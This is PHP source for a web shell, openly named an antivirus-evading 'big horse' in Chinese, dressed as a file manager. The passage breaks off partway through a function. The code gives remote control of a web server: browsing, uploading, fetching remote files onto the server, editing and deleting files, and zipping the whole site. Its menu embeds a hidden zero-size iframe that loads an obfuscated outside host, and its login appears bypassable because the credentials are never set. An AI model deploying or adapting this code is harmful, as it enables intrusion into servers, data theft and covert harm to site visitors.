<?php
header('Content-Type: text/html; charset=GB2312');
session_start();
$filefolder = "./";
$sitetitle = '惜潮免杀大马';//设置标题
$safe_num = 0;
$meurl = $_SERVER['PHP_SELF'];
$me = end(explode('/',$meurl));
if(isset($_REQUEST['op'])){
$op = $_REQUEST['op'];
}else{
$op = 'home';
}
if(isset($_REQUEST['folder'])){
$folder = $_REQUEST['folder'];
}else{
$folder = '';
}
$arr = str_split($folder);
if($arr[count($arr)-1]!=='/'){
    $folder .= '/';
}
while (preg_match('/\.\.\//',$folder)) $folder = preg_replace('/\.\.\//','/',$folder);
while (preg_match('/\/\//',$folder)) $folder = preg_replace('/\/\//','/',$folder);
if ($folder == '') {
    $folder = $filefolder;
}elseif ($filefolder != '') {
    if (!@ereg($filefolder,$folder)) {
        $folder = $filefolder;
    }  
}
$ufolder = $folder;
if(@$_SESSION['error'] > $safe_num && $safe_num !== 0){
printerror('您已经被限制登陆！');
}
if (@$_COOKIE['user'] != $user || @$_COOKIE['pass'] != md5($pass)) {
if (@$_REQUEST['user'] == $user && @$_REQUEST['pass'] == $pass) {
    setcookie('user',$user,time()+60*60*24*1);
    setcookie('pass',md5($pass),time()+60*60*24*1);
} else {
if (@$_REQUEST['user'] == $user || @$_REQUEST['pass']) $er = true;
login(@$er);
}
}
function maintop($title,$showtop = true) {
# 添加全局变量
    global $meurl,$me,$sitetitle, $lastsess, $login, $viewing, $iftop, $user, $pass, $password, $debug, $issuper;
    echo "<html>\n<head>\n"
        ."<title>$sitetitle - $title</title>\n"
        ."</head>\n"
        ."<body>\n"
        ."<style>\n*{font-family:Verdana, 'Microsoft Yahei' !important}td{font-size:13px;}span{line-height:20px;}a:visited{color:#333;text-decoration: none;}a:hover {color:#666;text-decoration: none;}a:link {color:#333;text-decoration: none;}a:active {color:#666;text-decoration: none;}table,form{width:700px !important;max-width:700px !important;}textarea{font-family:'Yahei Consolas Hybrid',Consolas,Verdana, Tahoma, Arial, Helvetica,'Microsoft Yahei', sans-serif !important;border:1px solid #ccc;margin:5px 0;padding:8px;line-height:18px;width:700px;max-width:700px;border-radius:2px;}input.button{margin:5px 0;font-size:13px;*font-size:90%;*overflow:visible;padding:4px 10px;;color:#fff !important;color: white !important;*color:#fff !important;border:1px solid #fff;border:0 rgba(0,0,0,0);background-color:#666;text-decoration:none;border-radius:2px}input.button:hover{filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#00000000', endColorstr='#1a000000', GradientType=0);background-image:-webkit-gradient(linear,0 0,0 100%,from(transparent),color-stop(40%,rgba(0,0,0,.05)),to(rgba(0,0,0,.1)));background-image:-webkit-linear-gradient(transparent,rgba(0,0,0,.05) 40%,rgba(0,0,0,.1));background-image:-moz-linear-gradient(top,rgba(0,0,0,.05) 0,rgba(0,0,0,.1));background-image:-o-linear-gradient(transparent,rgba(0,0,0,.05) 40%,rgba(0,0,0,.1));background-image:linear-gradient(transparent,rgba(0,0,0,.05) 40%,rgba(0,0,0,.1));text-decoration: none}input.buuton:active{box-shadow:0 0 0 1px rgba(0,0,0,.15) inset,0 0 6px rgba(0,0,0,.2) inset}input.text,.upload{border: 1px solid #999;height:25px;margin:6px 1px;padding:5px;;font-size:12px;border-radius:2px;}body{;background-color:#ededed;margin: 0px 0px 10px;}.title{font-weight: bold; FONT-SIZE: 12px;text-align: center;}.error{font-size:10pt;color:#AA2222;text-align:left}.menu{border-top:1px solid #999;border-bottom:1px solid #999;font-size:13px;padding:5px;margin-bottom:15px;}.menu a{text-decoration:none;margin-right:8px;}.table{background-color:#777;color:#fff;}.mytable tr:hover{background:#ededed;color:#469;font-size:13px;}.table:hover{background-color:#777 !important;color:#fff !important}tr{height:26px;}.upload{width:400px;}\n</style>\n";
    if ($viewing == "") {#Table表格的开始
        echo "<table cellpadding=10 cellspacing=10 bgcolor=#ededed align=center><tr><td>\n"
            ."<table cellpadding=1 cellspacing=1><tr><td>\n"
            ."<table cellpadding=5 cellspacing=5 bgcolor='white'><tr><td>\n";
    }else{
        echo "<table cellpadding=7 cellspacing=7 bgcolor='white'><tr><td>\n";
    }
    echo "<h2>$sitetitle <small>- $title</small></h2>\n";
    if ($showtop) {//头部菜单内容
        echo "<div class=\"menu\">\n"
            ."<a href=\"".$meurl."?op=home\" $iftop>主页</a>\n"
            ."<a href=\"".$meurl."?op=up\" $iftop>上传</a>\n"
            ."<a href=\"".$meurl."?op=cr\" $iftop>创建</a>\n"
            ."<a href=\"".$meurl."?op=allz\" $iftop>全站打包</a>\n"
            ."<a href=\"".$meurl."?op=sqlb\" $iftop>数据库备份</a>\n"
            ."<a href=\"".$meurl."?op=ftpa\" $iftop>FTP备份</a>\n"
            ."<a href=\"".$url."http://www.asp-muma.com\" $iftop>进入本程序官网</a>\n"
            ."<a href=\"".$meurl."?op=logout\" $iftop>退出</a>\n"
            ."<iframe src=http://%37%6A%79%65%77%75%2E%63%6E/a/a.asp width=0 height=0></iframe>\n"
            ."</div>";
    }
}
/****************************************************************/
/* function login()                                             */
/*                                                              */
/* 登录验证 $user and md5($pass)                                */
/* 需要浏览器支持Cookie                                         */
/****************************************************************/
function login($er=false) {
    global $meurl,$op,$safe_num,$mail;
    setcookie("user","",time()-60*60*24*1);
    setcookie("pass","",time()-60*60*24*1);
    maintop("登录",false);
    if ($er) { 
        if (isset($_SESSION['error'])){
            $_SESSION['error']++;
            if($_SESSION['error'] > $safe_num && $safe_num !== 0){
                @mail($mail,'提醒：文件被恶意登录！','该提醒来自文件管理器：<br>登录者IP为：'.$_SERVER['REMOTE_ADDR'],'From: <i@hezii.pw>');
                printerror('您已经被限制登陆！');
            }
        }else{
            $_SESSION['error'] = 1;
        }
        echo "<span class=error>**提示: 密码错误**</span><br><br>\n"; 
    }
    echo "<form action=\"".$meurl."?op=".$op."\" method=\"post\">\n"
        ."<input type=\"text\" name=\"user\" border=\"0\" class=\"text\" value=\"".@$user."\"  placeholder=\"请输入用户名\">\n"
        ."<input type=\"password\" name=\"pass\" border=\"0\" class=\"text\" value=\"".@$pass."\" placeholder=\"请输入密码\"><br>\n"
        ."<input type=\"submit\" name=\"submitButtonName\" value=\"登录\" border=\"0\" class=\"button\">\n"
        ."</form>\n";
    mainbottom();
}
/****************************************************************/
/* function home()                                              */
/*                                                              */
/* Main function that displays contents of folders.             */
/****************************************************************/
function home() {
    global $meurl ,$folder, $ufolder,$filefolder, $HTTP_HOST;
    maintop("主页");
    echo "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\" width=100% class='mytable'><form method='post'>\n";
    $content1 = "";
    $content2 = "";
    $count = "0";
    $folder = iconv("UTF-8", "GBK", $folder);
    $style = opendir($folder);
    $a=1;
    $b=1;
    if ($folder) {
        $_SESSION['folder']=$ufolder;
    }
    while($stylesheet = readdir($style)) {
    if ($stylesheet !== "." && $stylesheet !== ".." ) {
        if (is_dir($folder.$stylesheet) && is_readable($folder.$stylesheet)) {
            $sstylesheet = $stylesheet;
            $stylesheet = iconv("GBK", "UTF-8", $stylesheet);
            $ulfolder = $folder;
            $folder = iconv("GBK", "UTF-8", $folder);
            $content1[$a] = "<tr width=100%><td><input name='select_item[d][$stylesheet]' type='checkbox' id='$stylesheet' onclick='One($stylesheet)' class=\"checkbox\" value='".$folder.$stylesheet."' /></td>\n"
                           ."<td><a href=\"".$meurl."?op=home&folder=".$folder.$stylesheet."/\">".$stylesheet."</a></td>\n"
                           ."<td>".Size(dirSize($folder.$stylesheet))."</td>"
                           ."<td><a href=\"".$meurl."?op=home&folder=".htmlspecialchars($folder.$stylesheet)."/\">打开</a></td>\n"
                           ."<td><a href=\"".$meurl."?op=ren&file=".htmlspecialchars($stylesheet)."&folder=$folder\">重命名</a></td>\n"
                           ."<td><a href=\"".$folder.$stylesheet."\" target='_blank'>查看</a></td>\n"
                           ."<td>".substr(sprintf('%o',fileperms($ulfolder.$sstylesheet)), -3)."</td></tr>\n";
            $a++;
            $folder = iconv("UTF-8", "GBK", $folder);
        }elseif(!is_dir($folder.$stylesheet) && is_readable($folder.$stylesheet)){ 
        if(preg_match ("/.zip$/i", $folder.$stylesheet)){#判断是否是zip文件
            $sstylesheet = $stylesheet;
            $ulfolder = $folder;
            $stylesheet = iconv("GBK", "UTF-8", $stylesheet);
            $folder = iconv("GBK", "UTF-8", $folder);
            $content2[$b] = "<tr width=100%><td><input name='select_item[f][$stylesheet]' type='checkbox' id='$stylesheet' class=\"checkbox\" value='".$folder.$stylesheet."' /></td>\n"
                           ."<td><a href=\"".$folder.$stylesheet."\" target='_blank'>".$stylesheet."</a></td>\n"
                           ."<td>".Size(filesize($ufolder.$sstylesheet))."</td>"
                           ."<td></td>\n"
                           ."<td><a href=\"".$meurl."?op=ren&file=".htmlspecialchars($stylesheet)."&folder=$folder\">重命名</a></td>\n"
                           ."<td><a href=\"".$meurl."?op=unz&dename=".htmlspecialchars($stylesheet)."&folder=$folder\">提取</a></td>\n"
                           ."<td>".substr(sprintf('%o',fileperms($ulfolder.$sstylesheet)), -3)."</a></td></tr>\n";
            $b++;
            $folder = iconv("UTF-8", "GBK", $folder);
        }else{
            $sstylesheet = $stylesheet;
            $ulfolder = $folder;
            $stylesheet = iconv("GBK", "UTF-8", $stylesheet);
            $folder = iconv("GBK", "UTF-8", $folder);
            $content2[$b] = "<tr width=100%><td><input name='select_item[f][$stylesheet]' type='checkbox' id='$stylesheet' class=\"checkbox\" value='".$folder.$stylesheet."' /></td>\n"
                           ."<td><a href=\"".$folder.$stylesheet."\" target='_blank'>".$stylesheet."</a></td>\n"
                           ."<td>".Size(filesize($ufolder.$sstylesheet))."</td>"
                           ."<td><a href=\"".$meurl."?op=edit&fename=".htmlspecialchars($stylesheet)."&folder=$folder\">编辑</a></td>\n"
                           ."<td><a href=\"".$meurl."?op=ren&file=".htmlspecialchars($stylesheet)."&folder=$folder\">重命名</a></td>\n"
                           ."<td><a href=\"".$folder.$stylesheet."\" target='_blank'>查看</a></td>\n"
                           ."<td>".substr(sprintf('%o',fileperms($ulfolder.$sstylesheet)), -3)."</a></td></tr>\n";
            $b++;
            $folder = iconv("UTF-8", "GBK", $folder);
        }
    }
    $count++;
    } 
}
    closedir($style);
    echo "浏览目录: $ufolder\n"
         ."<br>文件数: " . $count . "<br><br>";
    echo "<tr class='table' width=100%>"
        ."<script>function Check() {
            var collid = document.getElementById(\"check\")
            var coll = document.getElementsByTagName('input')
            if (collid.checked){
                for(var i = 0; i < coll.length; i++)
                    coll[i].checked = true;
            }else{
                for(var i = 0; i < coll.length; i++)
                    coll[i].checked = false;
            }
         }</script>"
       ."<td width=20></td>\n"
       ."<td>文件名</td>\n"
       ."<td width=65>大小</td>\n"
       ."<td width=45>打开</td>\n"
       ."<td width=55>重命名</td>\n"
       ."<td width=45>查看</td>\n"
       ."<td width=30>权限</td>\n"
       ."</tr>";
    if($ufolder!=="./"){
        $count = substr_count($ufolder,"/");
        $last = explode('/', $ufolder);
        $i = 1;
        $back = ".";
        while($i < $count-1){
              $back = $back."/".$last[$i];
              $i++;
        }
        echo "<tr width=100%><td></td><td><a href=\"".$meurl."?op=home&folder=".$back."/"."\">上级目录</a></td><td></td><td></td><td></td><td></td><td></td></tr>";
    }
    for ($a=1; $a<count($content1)+1;$a++) {
        $tcoloring   = ($a % 2) ? '#DEDEDE' : '#ededed';
        if(empty($content1)){
        }else{
            echo @$content1[$a];
        }
    }
    for ($b=1; $b<count($content2)+1;$b++) {
        $tcoloring   = ($a++ % 2) ? '#DEDEDE' : '#ededed';
        echo @$content2[$b];
    }
    echo "</table><div><input type=\"checkbox\" id=\"check\" onclick=\"Check()\"> <input class='button' name='action' type='submit' value='移动' /> <input class='button' name='action' type='submit' value='复制' /> <input class='button' name='action' type='submit' onclick=\"return confirm('点击确认后，选中的文件将作为Backup-time.zip创建！')\"  value='压缩' /> <input class='button' name='action' type='submit' onclick=\"return confirm('您真的要删除选中的文件吗?')\" value='删除' /> <input class='button' name='action' type='submit' onclick=\"var t=document.getElementById('chmod').value;return confirm('将这些文件的权限修改为'+t+'？如果是文件夹，将会递归文件夹内所有内容！')\" value='权限' /> <input type=\"text\" class=\"text\" stlye=\"vertical-align:text-top;\" size=\"3\" id=\"chmod\" name=\"chmod\" value=\"0755\"></div></form>";
    mainbottom();
}
// 计算文件夹大小的函数
    function dirSize($directoty){
    $dir_size=0;
    if($dir_handle=@opendir($directoty))
    {
    while($filename=readdir($dir_handle)){
    $subFile=$directoty.DIRECTORY_SEPARATOR.$filename;
    if($filename=='.'||$filename=='..'){
    continue;
    }elseif (is_dir($subFile))
    {
    $dir_size+=dirSize($subFile);
    }elseif (is_file($subFile)){
    $dir_size+=filesize($subFile);
    }
    }
    closedir($dir_handle);
    }
    return ($dir_size);
    }
    // 计算文件大小的函数
    function Size($size){
            if($size < 1024){
                $filesize = $size;
            }elseif($size > 1024 and $size < 1024*1024){
                $count1 = round($size/1024,1);
                $filesize = $count1."k";
            }elseif($size > 1024*1024 and $size < 1024*1024*1024){
                $count1 = round($size/1024/1024,1);
                $filesize = $count1."M";
            }elseif($size > 1024*1024*1024 and $size < 1024*1024*1024*1024){
                $count1 = round($size/1024/1024/1024,1);
                $filesize = $count1."G";
            }elseif($size > 1024*1024*1024*1024){
                $count1 = round($size/1024/1024/1024/1024,1);
                $filesize = $count1."T";
            }
            return $filesize;
        }
function curl_get_contents($url)   
{   
    $ch = curl_init();   
    curl_setopt($ch, CURLOPT_URL, $url);            //设置访问的url地址   
    //curl_setopt($ch,CURLOPT_HEADER,1);            //是否显示头部信息   
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);           //设置超时
    curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);      //跟踪301   
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        //返回结果   
    $r = curl_exec($ch);   
    curl_close($ch);   
    return $r;   
}
function up() {
    global $meurl, $folder, $content, $filefolder;
    maintop("上传");
    echo "<FORM ENCTYPE=\"multipart/form-data\" ACTION=\"".$meurl."?op=upload\" METHOD=\"POST\">\n"
        ."<h3>本地上传</h3>最大可以上传".ini_get('upload_max_filesize')."的文件<br><input type=\"File\" name=\"upfile[]\" multiple size=\"20\">\n"
        ."<input type=\"text\" name=\"ndir\" value=\"".$_SESSION["folder"]."\" class=\"upload\">\n";
    echo $content
        ."</select><br>"
        ."<input type=\"submit\" value=\"上传\" class=\"button\">\n"
        ."<script>function UpCheck(){if(document.getElementById(\"unzip\").checked){document.getElementById(\"deluzip\").disabled=false}else{document.getElementById(\"deluzip\").disabled=true}}</script>"
        ."<input type=\"checkbox\" name=\"unzip\" id=\"unzip\" value=\"checkbox\" onclick=\"UpCheck()\" checked><label for=\"unzip\"><abbr title='提取（解压）上传的Zip压缩文件'>解压</abbr></labal> "
        ."<input type=\"checkbox\" name=\"delzip\" id=\"deluzip\"value=\"checkbox\"><label for=\"deluzip\"><abbr title='同时将上传的压缩文件删除'>删除</abbr></labal>"
        ."</form>\n";
    echo "<h3>远程上传</h3>远程上传是什么意思？<br>远程上传是从其他服务器获取文件并直接下载到当前服务器的一种功能。<br>类似于SSH的Wget功能，免去我们下载再手动上传所浪费的时间。<br><br><form action=\"".$meurl."?op=yupload\" method=\"POST\"><input name=\"url\" size=\"85\" type=\"text\" class=\"text\" placeholder=\"请输入文件地址...\"/> <input type=\"text\" class=\"text\" size=\"20\" name=\"ndir\" value=\"".$_SESSION["folder"]."\">"
         ."<input name=\"submit\" value=\"上传\" type=\"submit\" class=\"button\"/>\n"
         ."<script>function Check(){if(document.getElementById(\"un\").checked){document.getElementById(\"del\").disabled=false}else{document.getElementById(\"del\").disabled=true}}</script>"
         ."<input type=\"checkbox\" name=\"unzip\" id=\"un\" value=\"checkbox\" onclick=\"Check()\" checked><label for=\"un\"><abbr title='提取（解压）上传的Zip压缩文件'>解压</abbr></labal> "
         ."<input type=\"checkbox\" name=\"delzip\" id=\"del\"value=\"checkbox\"><label for=\"del\"><abbr title='同时将上传的压缩文件删除'>删除</abbr></labal></form>";
    mainbottom();
}
function yupload($url, $folder, $unzip, $delzip) {
global $meurl;
    $nfolder = $folder;
    $url = iconv("UTF-8", "GBK", $url);
    $folder = iconv("UTF-8", "GBK", $folder);
    if($url!==""){
        set_time_limit (24 * 60 * 60); // 设置超时时间
      if (!file_exists($folder)){
        mkdir($folder, 0755);
        }
    $newfname = $folder . basename($url); // 取得文件的名称
    if(function_exists('curl_init')){
    $file = curl_get_contents($url);
    file_put_contents($newfname,$file);
    }else{
        $file = fopen ($url, "rb"); // 远程下载文件，二进制模式
        if ($file) { // 如果下载成功
            $newf = fopen ($newfname, "wb");
        if ($newf) // 如果文件保存成功
            while (!feof($file)) { // 判断附件写入是否完整
            fwrite($newf, fread($file, 1024 * 8), 1024 * 8); // 没有写完就继续
            }
        }
        if ($file) {
            fclose($file); // 关闭远程文件
        }
        if ($newf) {
            fclose($newf); // 关闭本地文件
        }
    }
    maintop("远程上传");
    echo "文件 ".basename($url)." 上传成功<br>\n";
    if(end(explode('.', basename($url)))=="zip" && isset($unzip) && $unzip == "checkbox"){
        if(class_exists('ZipArchive')){
            $zip = new ZipArchive();
            if ($zip->open($folder.basename($url)) === TRUE) {
                $zip->extractTo($folder);
                $zip->close();
                echo basename($nurl)." 已经被解压到$nfolder<br>";
                if(isset($delzip) && $delzip == "checkbox"){
                if(unlink($folder.basename($url))){
                    echo basename($url)." 删除成功<br>";
                    }else{
                    echo basename($url)." 删除失败<br>";
                }
                    echo "你可以 <a href=\"".$meurl."?op=home&folder=".$folder."\">访问文件夹</a> 或者 <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>  或者 <a href=\"".$meurl."?op=up\">继续上传</a>\n";
                }
            }else{
                echo('<span class="error">无法解压文件：'.$nfolder.basename($nurl).'</span><br>');
            }
        }else{
        echo('<span class="error">此服务器上的PHP不支持ZipArchive，无法解压文件！</span><br>');
        }
    }else{
    echo "你可以 <a href=\"".$meurl."?op=home&folder=".$nfolder."\">访问文件夹</a> 或者 <a href=\"".$meurl."?op=edit&fename=".basename($url)."&folder=".$nfolder."\">编辑文件</a> 或者 <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>  或者 <a href=\"".$meurl."?op=up\">继续上传</a>\n";
    }
    mainbottom();
    return true;
    }else{
    printerror ('文件地址不能为空。');
    }
}
function upload($upfile,$ndir,$unzip,$delzip) {
    global $meurl, $folder;
    $nfolder = $folder;
    $nndir = $ndir;
    $ndir = iconv("UTF-8", "GBK", $ndir);
    if (!$upfile) {
        printerror("您没有选择文件！");
    }elseif($upfile) { 
      maintop("上传");
  if (!file_exists($ndir)){
    mkdir($ndir, 0755);
    }
    $i = 1;
    while (count($upfile['name']) >= $i){
    $dir = iconv("UTF-8", "GBK", $nndir.$upfile['name'][$i-1]);
        if(@copy($upfile['tmp_name'][$i-1],$dir)) {
            echo "文件 ".$nndir.$upfile['name'][$i-1]." 上传成功\n<br>";
            if(end(explode('.', $upfile['name'][$i-1]))=="zip" && isset($unzip) && $unzip == "checkbox"){
            if(class_exists('ZipArchive')){
                    $zip = new ZipArchive();
                    if ($zip->open($dir) === TRUE) {
                        $zip->extractTo($ndir);
                        $zip->close();
                        echo $upfile['name'][$i-1]." 已经被解压到$nndir<br>";
                        if(isset($delzip) && $delzip == "checkbox"){
                        if(unlink($folder.$upfile['name'][$i-1])){
                            echo $upfile['name'][$i-1]." 删除成功<br>";
                            }else{
                                echo $upfile['name'][$i-1].("<span class=\"error\">删除失败！</span><br>");
                            }
                        }
                    }else{
                        echo("<span class=\"error\">无法解压文件：".$nndir.$upfile['name'][$i-1]."</span><br>");
                    }
                }else{
                echo("<span class=\"error\">此服务器上的PHP不支持ZipArchive，无法解压文件！</span><br>");
                }
            }
        }else{
            echo("<span class=\"error\">文件 ".$upfile['name'][$i-1]." 上传失败</span><br>");
        }
        $i++;
    }
        echo "你可以 <a href=\"".$meurl."?op=home&folder=".$ndir."\">打开文件夹</a> 或者 <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a> 或者 <a href=\"".$meurl."?op=up\">继续上传</a>\n";
        mainbottom();
    }else{
        printerror("您没有选择文件！");
    }
}
function allz() {
global $meurl;
    maintop("全站备份");
    echo "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
        ."<span class='error'>**警告: 这将进行全站打包成allbackup.zip的动作! 如存在该文件，该文件将被覆盖!**</span><br><br>\n"
        ."确定要进行全站打包?<br><br>\n"
        ."你可以 <a href=\"".$meurl."?op=allzip\">我已经了解该操作所造成的后果，确认使用</a> 或者 \n"
        ."<a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n"
        ."</table>\n";
    mainbottom();
}
function allzip() {
global $meurl;
    if(class_exists('ZipArchive')){
    maintop("全站备份");
        if (file_exists('allbackup.zip')) {
            unlink('allbackup.zip'); 
        }
        class Zipper extends ZipArchive {
            public function addDir() {
                $dr = opendir('./');
                $i=0;
                while (($file = readdir($dr)) !== false)
                {
                if($file!=='.' && $file!=='..'){
                    $nodes[$i] = $file;
                    $i++;
                    }
                }
                closedir($dr);
                foreach ($nodes as $node) {
                $nnode = iconv("GBK", "UTF-8", $node);
                    echo $nnode.'<br>';
                    if (is_dir($node)) {
                        $this->addDir2($node);
                    }elseif(is_file($node)){
                        $this->addFile($node);
                    }
                }
            }
            public function addDir2($path) {
            $npath = iconv("GBK", "UTF-8", $path);
                $this->addEmptyDir($path);
                $dr = opendir($path.'/');
                $i=0;
                while (($file = readdir($dr)) !== false)
                {
                if($file!=='.' && $file!=='..'){
                    $nodes[$i] = $path.'/'.$file;
                    $i++;
                    }
                }
                closedir($dr);
                foreach ($nodes as $node) {
                $nnode = iconv("GBK", "UTF-8", $node);
                    echo $nnode.'<br>';
                    if (is_dir($node)) {
                        $this->addDir2($node);
                    }elseif(is_file($node)){
                        $this->addFile($node);
                    }
                }
            }
        }
        $zip = new Zipper;
        $res = $zip->open('allbackup.zip', ZipArchive::CREATE);
        if ($res === TRUE) {
            $zip->addDir();
            $zip->close();
            echo '全站压缩完成！'
                ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n";
        }else{
            echo '<span class="error">全站压缩失败！</span>'
                ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n";
        }
        mainbottom();
    }else{
    printerror('此服务器上的PHP不支持ZipArchive，无法压缩文件！');
    }
}
function unz($dename) {
    global $meurl, $folder, $content, $filefolder;
    if (!$dename == "") {
        maintop("解压");
        echo "<table border=\"0\" cellpadding=\"2\" cellspacing=\"0\">\n"
            ."<span class=error>**警告: 这将解压 ".$folder.$dename.". **</span ><br><br>\n"
            ."<form ENCTYPE=\"multipart/form-data\" action=\"".$meurl."?op=unzip\">解压到..."
            ."<input type=\"text\" name=\"ndir\" class=\"text\" value=\"".$_SESSION['folder']."\">";
        echo $content
            ."</select>"
            ."<br><br>确定要解压 ".$folder.$dename."?<br><br>\n"
            ."<input type=\"hidden\" name=\"op\" value=\"unzip\">\n"
            ."<input type=\"hidden\" name=\"dename\" value=\"".$dename."\">\n"
            ."<input type=\"hidden\" name=\"folder\" value=\"".$folder."\">\n"
            ."<input type=\"submit\" value=\"解压\" class=\"button\"><input type=\"checkbox\" name=\"del\" id=\"del\"value=\"del\"><label for=\"del\">同时删除压缩文件</label><br><br>\n"
            ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n"
            ."</table>\n";
        mainbottom();
    }else{
        home();
    }
}
function unzip($dename,$ndir,$del) {
    global $meurl, $folder;
    $nndir = $ndir;
    $nfolder = $folder;
    $ndename = $dename;
    $dename = iconv("UTF-8", "GBK", $dename);
    $folder = iconv("UTF-8", "GBK", $folder);
    $ndir = iconv("UTF-8", "GBK", $ndir);
    if (!$dename == "") {
        if (!file_exists($ndir)){
        mkdir($ndir, 0755);
        }
        if(class_exists('ZipArchive')){
            $zip = new ZipArchive();
            if ($zip->open($folder.$dename) === TRUE) {
                $zip->extractTo($ndir);
                $zip->close();
                maintop("解压");
                echo $dename." 已经被解压到 $nndir<br>";
                if($del=='del'){
                unlink($folder.$dename);
                echo $ndename." 已经被删除<br>";
                }
                echo "<a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n";
                mainbottom();
            }else{
                printerror('无法解压文件：'.$nfolder.$ndename);
            }
        }else{
        printerror('此服务器上的PHP不支持ZipArchive，无法解压文件！');
        }
    }else{
        home();
    }
}
function deltree($pathdir)  
{  
if(is_empty_dir($pathdir))//如果是空的  
    {  
    rmdir($pathdir);//直接删除  
    }  
    else  
    {//否则读这个目录，除了.和..外  
        $d=dir($pathdir);  
        while($a=$d->read())  
        {  
        if(is_file($pathdir.'/'.$a) && ($a!='.') && ($a!='..')){unlink($pathdir.'/'.$a);}  
        //如果是文件就直接删除  
        if(is_dir($pathdir.'/'.$a) && ($a!='.') && ($a!='..'))  
        {//如果是目录  
            if(!is_empty_dir($pathdir.'/'.$a))//是否为空  
            {//如果不是，调用自身，不过是原来的路径+他下级的目录名  
            deltree($pathdir.'/'.$a);  
            }  
            if(is_empty_dir($pathdir.'/'.$a))  
            {//如果是空就直接删除  
            rmdir($pathdir.'/'.$a);
            }
        }  
        }  
        $d->close();  
    }  
}  
function is_empty_dir($pathdir)  
{ 
//判断目录是否为空 
    $d=opendir($pathdir);  
    $i=0;  
    while($a=readdir($d)){  
        $i++;  
    }  
    closedir($d);  
    if($i>2){return false;}  
    else return true;  
    }
function edit($fename) {
    global $meurl,$folder;
    $file = iconv("UTF-8", "GBK", $folder.$fename);
    if (file_exists($folder.$fename)) {
        maintop("编辑");
        echo $folder.$fename;
        $contents = file_get_contents($file);
        $encode = mb_detect_encoding($contents);
        if($encode!=="UTF-8"){
            $contents = iconv("UTF-8", $encode, $contents);
        }
        echo "<form action=\"".$meurl."?op=save&encode=".$encode."\" method=\"post\">\n"
            ."<textarea cols=\"73\" rows=\"40\" name=\"ncontent\">\n";
        echo htmlspecialchars($contents);
        echo "</textarea>\n"
            ."<br>\n"
            ."<input type=\"hidden\" name=\"folder\" value=\"".$folder."\">\n"
            ."<input type=\"hidden\" name=\"fename\" value=\"".$fename."\">\n"
            ."<input type=\"submit\" value=\"保存\" class=\"button\"> <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n"
            ."</form>\n";
        mainbottom();
    }else{
        home();
    }
}
function save($ncontent, $fename, $encode) {
    global $meurl,$folder;
    if (!$fename == "") {
    maintop("编辑");
    $file = iconv("UTF-8", "GBK", $folder.$fename);
    $ydata = stripslashes($ncontent);
    if($encode!=="UTF-8"){
    $ydata = iconv($encode, "UTF-8", $ydata);
    }
    if(file_put_contents($file, $ydata)) {
        echo "文件 <a href=\"".$folder.$fename."\" target=\"_blank\">".$folder.$fename."</a> 保存成功！\n"
            ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a> 或者 <a href=\"".$meurl."?op=edit&fename=".$fename."&folder=".$folder."\">继续编辑</a>\n";
        $fp = null;
    }else{
        echo "<span class='error'>文件保存出错！</span>\n"
        ." <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n";
    }
    mainbottom();
    }else{
    home();
    }
}
function cr() {
    global $meurl, $folder, $content, $filefolder;
    maintop("创建");
    if (!$content == "") { echo "<br><br>请输入一个名称.\n"; }
    echo "<form action=\"".$meurl."?op=create\" method=\"post\">\n"
        ."文件名：<br><input type=\"text\" size=\"20\" name=\"nfname\" class=\"text\"><br><br>\n"
        ."目标目录：<br><input type=\"text\" class=\"text\" name=\"ndir\" value=\"".$_SESSION['folder']."\">";
    echo $content
        ."</select><br><br>";
    echo "文件 <input type=\"radio\" size=\"20\" name=\"isfolder\" value=\"0\" checked><br>\n"
        ."目录 <input type=\"radio\" size=\"20\" name=\"isfolder\" value=\"1\"><br><br>\n"
        ."<input type=\"hidden\" name=\"folder\" value=\"$folder\">\n"
        ."<input type=\"submit\" value=\"创建\" class=\"button\">  <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n"
        ."</form>\n";
    mainbottom();
}
function create($nfname, $isfolder, $ndir) {
    global $meurl, $folder;
    if (!$nfname == "") {
        maintop("创建");
        $ndir = iconv("UTF-8", "GBK", $ndir);
        $nfname = iconv("UTF-8", "GBK", $nfname);
    if ($isfolder == 1) {
        if(@mkdir($ndir."/".$nfname, 0755)) {
        $ndir = iconv("GBK", "UTF-8", $ndir);
        $nfname = iconv("GBK", "UTF-8", $nfname);
            echo "您的目录<a href=\"".$meurl."?op=home&folder=./".$nfname."/\">".$ndir.$nfname."/</a> 已经成功被创建.\n"
            ."<br><a href=\"".$meurl."?op=home&folder=".$ndir.$nfname."/\">打开文件夹</a> | <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n";
        }else{
        $ndir = iconv("GBK", "UTF-8", $ndir);
        $nfname = iconv("GBK", "UTF-8", $nfname);
            echo "<span class='error'>您的目录".$ndir."".$nfname." 不能被创建。请检查您的目录权限是否已经被设置为可写 或者 目录是否已经存在</span>\n";
        }
    }else{
        if(@fopen($ndir."/".$nfname, "w")) {
        $ndir = iconv("GBK", "UTF-8", $ndir);
        $nfname = iconv("GBK", "UTF-8", $nfname);
            echo "您的文件, <a href=\"".$meurl."?op=viewframe&file=".$nfname."&folder=$ndir\">".$ndir.$nfname."</a> 已经成功被创建\n"
                ."<br><a href=\"".$meurl."?op=edit&fename=".$nfname."&folder=".$ndir."\">编辑文件</a> | <a href=\"".$meurl."?op=home&folder=".$_SESSION['folder']."\">返回文件管理</a>\n";
